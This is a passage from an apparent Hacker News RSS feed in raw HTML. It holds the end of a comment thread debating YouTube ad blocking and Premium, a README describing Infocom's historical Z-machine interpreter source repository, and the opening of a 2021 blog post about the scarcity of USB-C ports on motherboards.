                  <p><span>I remember there was a point where ads on YouTube were tolerable. It's wild how aggressive they are now. I don't even bother watching so many videos now that I have to sit through 2 mins of unskippable ads what feels like every minute. My partner recently subbed to Hulu and it's worse. You still pay monthly and they shove 2 - 3 minute ads every 5 minutes.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38327700"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327700" href="https://news.ycombinator.com/vote?id=38327700&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>On mobile, they don't play videos unless the screen is on except if it's an ad, then they have all of these favorable bugs where your phone unexpectedly starts playing a whistling song with a twanging ukulele talking about mattresses.<p>There's that other bug where they disable the navigation during the ads and you have to turn the screen off and back on to the lock screen to get rid of it.</p><p>Such fortuitous defects.</p><p>Brendan Eichs Brave browser bypasses the YouTube bullshit if you want a workaround on android
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                  <tr id="38327951"><td></td></tr>
                      <tr id="38327914"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327914" href="https://news.ycombinator.com/vote?id=38327914&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>G needs to Google the Streisand Effect. The ideal amount of fraud or non-compliance is never 0 and they have enough dumb suckers to feast upon. Leave the clever-enough alone</span></p></div></td></tr>
        </tbody></table></td></tr>
                      <tr id="38327309"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327309" href="https://news.ycombinator.com/vote?id=38327309&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>Extension takedown in 3.. 2..<p>Honestly though, it will come and it will be in a form of copyright infringement, or something vague like that.</p><p>Good luck. Don't build your castle on top of another castle.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38327512"><td></td></tr>
            <tr id="38327650"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327650" href="https://news.ycombinator.com/vote?id=38327650&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>The Chrome Web Store already blocks any extension with the ability to download videos from Youtube with the excuse of it "enabling piracy." Ironic considering that they allow downloaders for any other site. Only Youtube.com is banned. It smells like anti-competitive behavior to me.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="38327553"><td></td></tr>
                  <tr id="38327322"><td></td></tr>
                <tr id="38327348"><td></td></tr>
                <tr id="38327401"><td></td></tr>
                <tr id="38327518"><td></td></tr>
                <tr id="38327552"><td></td></tr>
                                    <tr id="38327694"><td></td></tr>
                      <tr id="38327422"><td></td></tr>
                <tr id="38327667"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327667" href="https://news.ycombinator.com/vote?id=38327667&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>Every time there's an article about this fight, someone inevitably chimes in with their "Just Buy Premium" contribution. While true, it's not very useful or topical, and it's been re-posted so many damn times that it's pretty much zero-value.<p>It's like going into a discussion about building your own custom PC from scratch and posting "Just buy it from Dell!" I mean, no shit!</p><p>Everyone obviously knows paying is an option. These articles/discussions aren't about the obvious, short, straightforward path.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38327871"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38327871" href="https://news.ycombinator.com/vote?id=38327871&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>The “just buy premium” comment is usually the lone voice of reason in a sea of people jumping through hoops to justify why they like getting things for free without paying for them.<p>There is value in reminding people that blocking ads when there is a paid ad free option is scummy behavior.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38328189"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_38328189" href="https://news.ycombinator.com/vote?id=38328189&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>&gt; justify<p>i don't need to justify my actions. I know adblocking is denying revenue to the platform. i don't care.</p><p>The "just buy premium" crowd is assuming that people are rich enough to afford premium. May be they should consider how priviledged they are for having the spare money to dump on premium.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="38327924"><td></td></tr>
            <tr id="38328033"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_38328033" href="https://news.ycombinator.com/vote?id=38328033&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>Google added our web pages to their index without paying us. and probably trained AI on our content without paying us. Just returning the favor.</span></p></div></td></tr>
        </tbody></table></td></tr>
                        <tr id="38327513"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327513" href="https://news.ycombinator.com/vote?id=38327513&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>&gt; creators actually get paid<p>Until I see a report of exactly how much my monthly fee directly goes to each of my subscribed channels, I'm never going to believe that.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38327624"><td></td></tr>
                <tr id="38327633"><td></td></tr>
                <tr id="38327641"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_38327641" href="https://news.ycombinator.com/vote?id=38327641&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>I wouldn't believe you if you told me you're subscribed to every Patreon of every content creator you consume the content of.<p>And again: avoiding paying the platform operators no matter the cost.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38327790"><td><table>  <tbody><tr>    <td indent="5"><img src="https://news.ycombinator.com/s.gif" height="1" width="200"></td><td>
      <center><a id="up_38327790" href="https://news.ycombinator.com/vote?id=38327790&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>&gt; I wouldn't believe you if you told me you're subscribed to every Patreon of every content creator you consume the content of.<p>Everyone’s YouTube consumption is different. I’m not the person you directed the comment at but I realistically follow less than a handful of creators on YouTube. Subscribing to all their Patreons (not sure if all of them have it) would be quite doable.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="38327969"><td></td></tr>
                              <tr id="38327665"><td></td></tr>
                  <tr id="38327678"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327678" href="https://news.ycombinator.com/vote?id=38327678&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>I'd consider paying for Premium if they remove the free with ads version of Youtube. Ideally every single person on the planet blocked ads on Youtube on every imaginable platform so they were forced to restrict all access to content if you didn't pay for Premium.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="38327589"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327589" href="https://news.ycombinator.com/vote?id=38327589&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>At this point I think it's the principle of the thing. I mean I have premium but I still want them to get smacked down for this because Google made one of the endgame moves to drink verification can.<p>Ads are supposed to incidental, you run ads and if too many people block them because they suck then congrats sucks for you. If no one sees them then sucks for you. Most people put up with TV ads when they're not even hard to skip. And for some reason IG ads are well liked. Forcing them harder I think has to make us confront what we're really doing here and what we're gaining by all this. Just pay for premium sounds nice when you don't think about it. If there's no universe where someone might actually prefer the ads if they were the same price then we're kinda admitting they have literally zero value to the viewer.</p><p>And that paints a very different picture of advertising than "the grease of the economic wheel" ya know? And clearly all advertising isn't like this, like I paid to see the Lego movie, Barbie was fantastic. I watched a YT video of a woman showing her design process for a product she's selling and it was fascinating but it was also just an ad. But if YT are there to suck just so you'll pay for it to suck less than that's not mutually beneficial trade that's extortion.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38327660"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38327660" href="https://news.ycombinator.com/vote?id=38327660&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>That’s a lot of words to say you want something for nothing. Embrace it, just say you don’t want to pay for content with attention or money.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38327722"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_38327722" href="https://news.ycombinator.com/vote?id=38327722&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><p><span>Ah yes I want it so much that despite being able to block YT ads for years and get all the content for free and still able to do that now I pay for premium. Clearly I just want free shit.<p>I know it's crazy but what I actually want is an ad model where I don't feel the need to make it go away and might actually enjoy. An ad model where it doesn't have to interrupt me and force itself upon my eyes because it's actually content I would watch on my own.</p><p>Like take for example Fly.io's blog. It's is some of the best advertising for the service and is definitely why I use them today. Raymond Hettenger's python YT series is a fantastic ad for his consultancy. Wendy's Twitter was/is  hilarious. But its a weird dynamic because if the content is <i>good</i> you don't have to pay for it which seems silly because it's an ad all the same.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                        <tr id="38327455"><td></td></tr>
                <tr id="38327501"><td></td></tr>
                <tr id="38328185"><td></td></tr>
                  <tr id="38327522"><td></td></tr>
                <tr id="38327594"><td></td></tr>
                              <tr id="38327325"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38327325" href="https://news.ycombinator.com/vote?id=38327325&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>apparently it only happens with google chrome browser (what a surprise!), another reason not to use that spyware that only consumes RAM.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38327612"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38327612" href="https://news.ycombinator.com/vote?id=38327612&amp;how=up&amp;goto=item%3Fid%3D38327017"></a></center>    </td><td><br><div>
                  <p><span>What makes this apparent? I've not observed or heard this to be true yet, e.g. the same problem has occured to me in Firefox. I've found making sure the adblocker rulesets are updated faster than the normal update schedule was planning tends to fix it.</span></p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="38327644"><td></td></tr>
                      </tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Infocom-zcode-terps: Historical source code for Infocom's Z-machine interpreters (163 pts)]]></title>
            <link>https://github.com/erkyrath/infocom-zcode-terps</link>
            <guid>38326878</guid>
            <pubDate>Sun, 19 Nov 2023 00:40:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/erkyrath/infocom-zcode-terps">https://github.com/erkyrath/infocom-zcode-terps</a>, See on <a href="https://news.ycombinator.com/item?id=38326878">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">Infocom Z-code Interpreters</h2>
<p dir="auto">This is a collection of Infocom's original Z-code interpreters for various home computers of the 1980s.</p>
<p dir="auto">Most of the interpreters are provided as assembly source code (for the 6502, Z-80, and so on). Some have compiled binaries as well. As with the Infocom game source code, what's available is what's available.</p>
<p dir="auto">This repo contains a small amount of internal documentation, mostly about how to create working floppy disks for each platform. It contains no personal or private communication, unless you count one footnote about a "straightforward" porting job.</p>
<hr>
<p dir="auto">Below I have documented all the directories and files, as best I understand them. Corrections and further details welcomed.</p>
<p dir="auto">Interesting tidbits:</p>
<p dir="auto">Many directories include a large "assembled printout" file (usually <code>.prn</code> or <code>.lst</code>). This is a text file containing the assembler output for a complete program, both hex bytes and opcodes. ("prn" because it is notionally formatted for a line printer.)</p>
<p dir="auto">The <code>unix</code> directory contains a C implementation of DIP, the virtual machine used to implement Fooblitzky. The <code>atari</code> and <code>ibm</code> directories contain assembly implementations of same. <code>unix/foo.dat</code> is the game file in question; <code>unix/ediptst.sum</code> would be a test suite game.</p>
<p dir="auto">(Wikipedia refers to this as "GZIP - Graphical Zork Interpreter Program". I'm not sure what the origin of that name is. It doesn't appear in the Infocom source as far as I can tell. A couple of files refer to it as "GRIP" or the "G-machine". I'll stick with "DIP".)</p>
<p dir="auto">The architecture of DIP is unexplored territory (for my generation at least!) At a glance, it has version byte 1 and a serial number starting at byte 12 (rather than 18, as in the Z-machine). The game file appears to include graphical sprite data in high VM memory, rather than as external resources. The opcodes in the DIP interpreter are different. And so on.</p>
<hr>
<h2 tabindex="-1" dir="auto">(root directory)</h2>
<ul dir="auto">
<li>pdp11.zip: ZIP, PDP-11 assembly (dated 1982-1983), presumably for reference for porting</li>
<li>maximumsize.doc: Max Z-code size for each platform</li>
<li>maxoldsize.doc: Old version of same</li>
<li>fixer.mud: MDL code -- convert linefeeds?</li>
<li>verify.speeds: Notes on how fast $VERIFY works on Zork 1 on each interpreter. (SEM, 12 Jul 1983)</li>
</ul>
<h2 tabindex="-1" dir="auto">create</h2>
<ul dir="auto">
<li>*.rno: Docs for creating floppies on various platforms, and then booting them up (all are in <a href="https://en.wikipedia.org/wiki/TYPSET_and_RUNOFF" rel="nofollow">Runoff</a> format)</li>
</ul>
<h2 tabindex="-1" dir="auto">ziptest: Z3 test game file</h2>
<ul dir="auto">
<li>ziptest.zip: Game file</li>
<li>ziptest.hex: Hex dump of same</li>
<li>ziptest.pre: "preload" segment of ziptest.zip</li>
<li>ziptest.pur: "pure" segment of ziptest.zip</li>
</ul>
<p dir="auto">This is the same game file archived <a href="https://eblong.com/infocom/" rel="nofollow">here</a> as <a href="https://eblong.com/infocom/gamefiles/ziptest-r40-s840613.z3" rel="nofollow">ziptest-r40-s840613.z3</a>.</p>
<p dir="auto">The <code>.pre</code> and <code>.pur</code> files concatenate to the original, except that in ziptest.pre, header byte 1 gets the "story file split" bit set and bytes 4-5 (himem) are $05FF. This is the usual way Z-code files are split for platforms that can't fit the whole game in memory at once.</p>
<h2 tabindex="-1" dir="auto">64: Commodore 64</h2>
<ul dir="auto">
<li>how-to-make-disks: Text docs for creating a C64 floppy</li>
<li>zip/*.src: C64 assembly</li>
<li>zip/c64zip-d.src: Assembled printout</li>
<li>zip/c64-d.zip: Zip binary</li>
<li>lzip/*.asm: C64 assembly (note that lzip/fast.lzip is also assembly)</li>
</ul>
<h2 tabindex="-1" dir="auto">c-128: Commodore 128</h2>
<ul dir="auto">
<li>ezip/_read.me: Changelog (through 11/13/87)</li>
<li>ezip/*.asm: Source</li>
<li>ezip/*.cbd: Source for "combined disk" version, which I think supports C64 and C128 on the same disk</li>
<li>xzip/_read.me: Changelog (through 11/13/87)</li>
<li>xzip/notes: Compilation docs</li>
<li>xzip/c128: Implementation notes on color and fonts</li>
<li>xzip/*.asm: Source</li>
<li>xzip/*.bat: Batch scripts for build</li>
<li>split/*: File split utility</li>
<li>tftp/*: File transfer utility</li>
</ul>
<h2 tabindex="-1" dir="auto">acorn: BBC Acorn</h2>
<ul dir="auto">
<li>--read.me: Changelog (1.15.85)</li>
<li>*.asm: Acorn assembly</li>
<li>tftpsrc.rno: Assembly for TFTP to put files on floppy? (not runoff, despite the name)</li>
</ul>
<h2 tabindex="-1" dir="auto">amiga: Commodore Amiga</h2>
<ul dir="auto">
<li>--read.me: Docs</li>
<li>patches.bugs: Patches for Amiga OS include files (for compiling)</li>
<li>production.info: Docs for making an Amiga game floppy</li>
<li>production.old: Same, old version</li>
<li>tftp.info: Docs on using TFTP to move a game file from DEC20 to Amiga</li>
<li>split.notes: Notes on porting the game-split utility to Atari ST</li>
<li>ref.txt: Customer docs for running a game</li>
<li>refcard.txt: Customer reference card for Amiga</li>
<li>refcard.old: Same, old version</li>
<li>support.info: Customer FAQs for support</li>
<li>intuition.bugs: Bugs "as reported to tech support"</li>
<li>shersound.list: Sherlock sound list</li>
<li>sound.readme: Docs on using the Amiga audio C code</li>
<li>kermit.doc: Docs for Amiga Kermit (Jack J. Rouse)</li>
<li>aterm.doc: Docs for Amica Aterm (Larry Phillips)</li>
<li>ss48: Batch script to mount a hard drive</li>
<li>startupii: Batch script, configure environment?</li>
<li>temp.zil: Fragment of the V6 ZIL parser? (Looks like "Arthur")</li>
<li>*.c, *.h, *.asm files: XZIP and YZIP interpreter code</li>
<li>batch/batch.info: Docs on compiling using batch scripts</li>
<li>batch/*.bat: Build scripts</li>
</ul>
<h2 tabindex="-1" dir="auto">apple: Apple 2</h2>
<ul dir="auto">
<li>read.me: Changelog (through 11/13/87)</li>
<li>applezip.sed: SED script (text replacement); not sure what it's for</li>
<li>apple-g.zip, apple-h.zip: ZIP binaries, two versions</li>
<li>oldzip/, zip/, ezip/, xzip/, yzip/: Directories containing assembly interpreter source. All files are assembly except .lst which are assembled printouts.</li>
<li>yzip/apl2iff: Graphics/sound utilities for Apple 2. (Mentions "Magnetic Scrolls format" for images?)</li>
<li>interp/: Interpreters or config data for V6 games?</li>
</ul>
<h2 tabindex="-1" dir="auto">atari: Atari</h2>
<ul dir="auto">
<li>atari-d.zip: ZIP binary</li>
<li>atari-grip.bin: DIP binary</li>
<li>*.src: Assembly for ZIP interpreter</li>
<li>*.dip: Assembly for DIP interpreter</li>
<li>atarizip-d.asm: assembled printouts (ZIP)</li>
<li>atari-grip.prn: assembled printouts (DIP)</li>
</ul>
<h2 tabindex="-1" dir="auto">basic: ???</h2>
<ul dir="auto">
<li>xzip.bin: ZIP binary</li>
<li>*.bas: BASIC bytecode having to do with putting files on a floppy? (not sure why there are several versions)</li>
</ul>
<p dir="auto">Not sure which BASIC this is. The <code>xzip.bin</code> file starts with the bytes "CBM", but the <code>*.bas</code> files don't look like <a href="http://fileformats.archiveteam.org/wiki/Commodore_BASIC_tokenized_file" rel="nofollow">C64 BASIC</a> to me.</p>
<h2 tabindex="-1" dir="auto">colorcomputer: TRS-80 CoCo 2</h2>
<ul dir="auto">
<li>read.me: Changelog (through 6/12/85)</li>
<li>cocozip.asm: Assembled printout</li>
<li>coco.zip: Hex dump of ZIP binary</li>
<li>cocoref.doc: Customer reference card for CoCo</li>
<li>*.asm: Assembly</li>
</ul>
<p dir="auto">This is the same source archived at the <a href="https://colorcomputerarchive.com/repo/Programming/Source/Infocom%20Adventure%20Games%20Interpreter/" rel="nofollow">CoCo Archive</a>.</p>
<h2 tabindex="-1" dir="auto">cpm80: CP/M</h2>
<ul dir="auto">
<li>read.me: Changelog (through Feb 5, 85)</li>
<li>zorkcpm.asm: ZIP source (Zilog Z80)</li>
<li>zorkcpm.prn: Assembled printout</li>
</ul>
<h2 tabindex="-1" dir="auto">cpm86: CP/M-86</h2>
<ul dir="auto">
<li>read.me: Changelog (through 08/18/84)</li>
<li>zip.a86: ZIP source (8086)</li>
<li>cpm86.old: Same, older version</li>
<li>tftp.asm: TFTP source</li>
</ul>
<h2 tabindex="-1" dir="auto">ibm: PC</h2>
<ul dir="auto">
<li>--read.me: Changelog (May 85)</li>
<li>notes: Notes on the contents</li>
<li>dip.asm: DIP source (monochrome)</li>
<li>lip.asm: DIP source (RGB)</li>
<li>dump.asm: Additional color-handling code for lip.asm</li>
<li>ezip.asm: EZIP source main file</li>
<li>*.ezp: Files included in ezip.asm</li>
<li>msibmzip.asm: ZIP for IBM IB2?</li>
<li>ibmzip.asm: ZIP for IBM (older)</li>
<li>ibmziplist.dan: Assembled printout for ibmzip.asm</li>
<li>bosszip.asm: ZIP with "boss key"</li>
<li>iboss.asm: ADditional boss-key code for bosszip.asm</li>
<li>create.asm: Utility to create a runnable binary (interpreter plus game data)</li>
<li>boot.asm: Bootstrap loader code</li>
<li>switches.txt: Interpreter command-line switches</li>
<li>gol.bat: Batch script to link <code>lip.com</code></li>
<li>install.bat: Batch script to create a playable floppy</li>
<li>installh.bat: Batch script to create a playable folder on a hard drive</li>
<li>installd.bat: Batch script to create a playable Cornerstone demo floppy</li>
<li>statline.bat: Batch script, ???</li>
<li>n2.compare: Diff of msibmzip.asm and boszip.asm</li>
</ul>
<h2 tabindex="-1" dir="auto">mac: Macintosh</h2>
<ul dir="auto">
<li>mx*.a: XZIP (or maybe YZIP) source, assembly</li>
<li>mx.lst: Assembled printout</li>
<li>yzip-f3.bin: Binary for YZIP</li>
<li>xzip.lst: XZIP source (Pascal)</li>
<li>xzip.r: Resource fork info for XZIP</li>
<li>gfx.c: C code to compress/uncompress image data</li>
<li>gfx.p: Same, Pascal</li>
<li>build.info: Build docs</li>
<li>build.old: Older docs</li>
<li>combined.ideas: Thoughts on creating a combined ZIP/EZIP/XZIP interpreter, with the idea of using high-end Macs as primary IF development machines</li>
<li>cracks.memo: Notes from "a pirate BBS" on cracking copy-protection, and how the <code>@piracy</code> ZIP opcode might be kept meaningful</li>
<li>hfs.memo*: Customer support info for an interpreter bug on the (then-new) Mac HFS filesystem</li>
<li>iconfix.memo: Customer support info for save files not showing the correct icon</li>
<li>zork0.bugfix: Bug report for MacOS 5.0, 6.0.0</li>
<li>production.info: Docs on creating a game floppy</li>
<li>production.old: Same, older</li>
<li>st_convert.notes: Notes on adjusting assembly source to MPW syntax</li>
<li>refcard.doc: Customer reference card for Macintosh</li>
<li>prepsound.p: Utility to convert Amiga sound files to Mac</li>
<li>serialize.c: Utility to tweak the serial number of a Z-code file</li>
<li>signaturize.info: Docs on setting the Mac creator/type codes for a Mac interpreter</li>
<li>signaturize.p: Utility to set the Mac creator/type codes on a Mac <em>floppy</em></li>
<li>tftp.p: File transmission utility</li>
<li>stftp.p: File sending utility (does more?)</li>
<li>testsound.p: Test playing sounds, I guess</li>
<li>av_*.asm: Another audio test</li>
<li>dissbits.a: Sample source for a "copy image with dissolve effect" routine</li>
<li>temp: Chunk of mx4.a</li>
<li>?: ?</li>
</ul>
<h2 tabindex="-1" dir="auto">msdos</h2>
<ul dir="auto">
<li>read.me: Changelog (through 10/29/84)</li>
<li>mszip.asm: ZIP assembly</li>
<li>create.asm: Create a floppy</li>
<li>setup.asm: Configure terminal to run ZIP properly</li>
</ul>
<h2 tabindex="-1" dir="auto">ti: TI Professional? (MS-DOS 2.0)</h2>
<ul dir="auto">
<li>read.me: Changelog (08/20/84)</li>
<li>tizip.asm: ZIP assembly</li>
<li>create.asm: Create a floppy</li>
<li>setup.asm: Configure terminal to run ZIP properly</li>
</ul>
<h2 tabindex="-1" dir="auto">msx: Microsoft MSX platform (Z80-based)</h2>
<ul dir="auto">
<li>read.me: Changelog (through 2-5-85)</li>
<li>zorkmsx.asm: ZIP assembly</li>
<li>zorkmsx.prn: Assembled printout</li>
<li>setmsx.asm: Configure your MSX terminal to run ZIP properly</li>
</ul>
<h2 tabindex="-1" dir="auto">tandy: Tandy 2000 (MS-DOS)</h2>
<ul dir="auto">
<li>read.me: Changelog (08/13/84)</li>
<li>tzip.asm: ZIP assembly</li>
<li>create.asm: Create a floppy</li>
</ul>
<h2 tabindex="-1" dir="auto">hp: HP PC (HP-DOS)</h2>
<ul dir="auto">
<li>read.me: Changelog (blank)</li>
<li>hpzip.asm: ZIP assembly</li>
<li>hpcreate.asm: Create a floppy</li>
</ul>
<h2 tabindex="-1" dir="auto">st: Atari ST</h2>
<ul dir="auto">
<li>stzip.s: ZIP source (assembly)</li>
<li>stx.s, stx*.s, sound.s: XZIP source (assembly)</li>
<li>xzip.c: XZIP source (C)</li>
<li>zip.c: ZIP source (top level only)</li>
<li>xzipdip.c, xzipdip.h: XZIP/DIP code (not used?)</li>
<li>squish.c: Utility to pull a user-selectable chunk of a Paintworks image file?</li>
<li>smash.c: Utility to combine a bunch of images into a library file?</li>
<li>fcompare.c: File compare utility</li>
<li>tftp.c: TFTP source</li>
<li>asm.note: Notes that the (stx*.s) source can compile either ZIP or EZIP depending on compiler defs</li>
<li>color.note: Implementation note on color usage</li>
<li>batch.info: Notes on compiling ZIP binaries</li>
<li>sid.notes: Notes on SID (debugger?)</li>
<li>graphics.ken: Notes on graphics file requirements</li>
<li>sound.notes: Notes on sound file requirements</li>
<li>nxtlin.bug, nxtlin.asm: Note on a display bug</li>
<li>scrnam.asm: Code used in *.s files</li>
<li>tftp.info: Docs on using TFTP to move a game file from DEC20 to ST</li>
<li>font2.dat: Presumably font data</li>
<li>refcard.txt: Customer reference card for Atari ST</li>
<li>readme.doc: Docs for GIA sound utility (via Activision)</li>
<li>gia.c: Sound player utility</li>
<li>makefile.gia: Makefile for GIA</li>
<li>pumpsnd.s: Assembly for low-level GIA code</li>
<li>pumpsnd_av.s: Modified version?</li>
<li>pumpsnd.old: Older version?</li>
</ul>
<h2 tabindex="-1" dir="auto">ted: CBM Plus/4</h2>
<ul dir="auto">
<li>plus4-c.zip: ZIP binary</li>
<li>plus4zip-c.asm: Assembled printout</li>
<li>*.src: Assembly</li>
</ul>
<h2 tabindex="-1" dir="auto">ti994: TI-99/4</h2>
<ul dir="auto">
<li>--read.me: Changelog (10/12/84)</li>
<li>ti_refbook.mss: Docs on creating and booting a game floppy</li>
<li>ti_refcard.mss: Customer reference card for TI-99</li>
<li>*.old: ZIP assembly (different parts of a single ZIP program, despite the confusing filenames)</li>
</ul>
<h2 tabindex="-1" dir="auto">unix</h2>
<ul dir="auto">
<li>--notes: TODO list</li>
<li>zip.c: Source for ZIP</li>
<li>zipdefs.h: Header for zip.c</li>
<li>phg_zip.c: Source for ZIP, modification by Paul H. Gross (5-October-1985)</li>
<li>phg_zipdefs.h: Modified header (not used)</li>
<li>dip.c: Source for DIP</li>
<li>folding.c: Code for word-wrapping feature</li>
<li>page.c: Code for memory-paging feature</li>
<li>dip.block: A chunk of dip.c having to do with image data</li>
<li>dip.call: A chunk of dip.c having to do with OPCALL</li>
<li>dip.init: A chunk of dip.c having to do with app startup</li>
<li>dip.ops: A chunk of dipdefs.h</li>
<li>block.c: Utility to display blocks of font or image data? (not part of the DIP interpreter)</li>
<li>foo.dat: Possibly the Fooblitzky game file?</li>
<li>foo.hex: Hex dump of foo.dat (referred to as "fooblitz.dat")</li>
<li>foo.pichex: A slice of foo.hex</li>
<li>ediptst.sum: DIP test game?</li>
<li>ediptst.hex: Hex dump of "ediptst.dip" (a chunk of ediptst.sum)</li>
<li>ediptst.pichex: Hex dump of "ediptst.pic" (the rest of of ediptst.sum)</li>
</ul>
<p dir="auto">Both DIP game files appear to include graphical data. Or so I infer from the <code>.pichex</code> files, which are hex dumps of the high end of the game file.</p>
<p dir="auto">I tried to decode the pichex files. <code>dip.c</code> implies that images are made of 8-byte (8x8 pixel) blocks, and if you split the pichex files that way you get reasonable blocks. One would have to do additional work to figure out which blocks to tile together to make complete "icons" or sprites.</p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why aren't motherboards mostly USB-C by now? (2021) (189 pts)]]></title>
            <link>https://philip.greenspun.com/blog/2021/03/22/why-arent-motherboards-mostly-usb-c-by-now/</link>
            <guid>38326242</guid>
            <pubDate>Sat, 18 Nov 2023 23:47:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://philip.greenspun.com/blog/2021/03/22/why-arent-motherboards-mostly-usb-c-by-now/">https://philip.greenspun.com/blog/2021/03/22/why-arent-motherboards-mostly-usb-c-by-now/</a>, See on <a href="https://news.ycombinator.com/item?id=38326242">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="primary"> <main id="main"> <article id="post-31689">  <div> <p>I’m beginning to think that the Windows PC that I built in 2015 is ready for retirement (though if Joe Biden can be president at 78, maybe this PC can last until 2029?). In looking at new desktop PCs and motherboards I am struck by the paucity of USB-C ports (<a href="https://en.wikipedia.org/wiki/USB-C">standardized in 2014</a>). It looks as though 0 and 1 are the most common number of USB-C ports on a 2021 PC.</p> <p>Wouldn’t it make more sense for all of the USB ports on a new PC to be USB-C and then use <a href="https://amzn.to/3rf1Ttu">adapters</a> for legacy components?</p> <p>From <em><a href="https://amzn.to/3lFXyOO">The Last Castle</a></em>, describing events of 1921:</p> <blockquote><p>Not everyone was immediately captivated with technology’s advances. Just months after Cornelia [Vanderbilt] celebrated “reaching her majority,” author Willa Cather gave a speech in which she presciently waxed philosophical on the subject of the phonograph. “We now have music by machines, we travel by machines,” she said. <strong>“Soon we will be having machines to do our thinking.”</strong></p></blockquote> <p>(Note that adulthood and voting in those days came at 21, not at 18!)</p> <p>The great Willa Cather expected great progress from the world’s nerds. What do we have 100 years later? <a href="https://www.dell.com/en-us/shop/desktop-computers/new-xps-desktop/spd/xps-8940-desktop/xd8940msr20h">A Dell XPS desktop PC</a>, “Engineered and designed with purpose for ultimate power and expandability”, equipped with a mechanical hard drive and a feeble 8 GB of RAM (is that even enough to run Windows by itself?).</p> <div><figure><a href="https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-36.png"><img decoding="async" fetchpriority="high" src="https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-36-1520x642.png" alt="" width="488" height="205" srcset="https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-36-1520x642.png 1520w, https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-36-1024x432.png 1024w, https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-36-300x127.png 300w, https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-36-768x324.png 768w, 